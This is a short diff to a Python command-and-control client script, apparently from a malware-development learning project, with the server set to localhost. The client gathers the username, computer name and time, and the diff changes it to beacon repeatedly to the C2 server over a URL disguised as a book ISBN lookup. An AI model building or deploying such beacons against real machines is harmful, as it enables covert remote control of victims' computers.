@@ -26,7 +26,7 @@ C2_SERVER = "localhost"
 # Path to use for signifying a command request form a client using HTTP GET
 CMD_REQUEST = "/book?isbn="
 
-# For a Windows OS, obtain unique identifiying information
+# Obtain unique identifiying information
 if getenv("OS") == "Windows_NT":
     client = getenv("USERNAME", "") + "@" + getenv("COMPUTERNAME", "") + "@" + str(time())
 elif platform == "linux" or platform == "linux2":
@@ -36,5 +36,6 @@ elif platform == "darwin":
 else:
     client = "unknown" + "@" + "unknown" + "@" + str(time())
 
-x = get(url=f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}", headers=HEADER, proxies=PROXY)
-print(x.status_code)
+while True:
+    x = get(url=f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}", headers=HEADER, proxies=PROXY)
+    print(x.status_code)
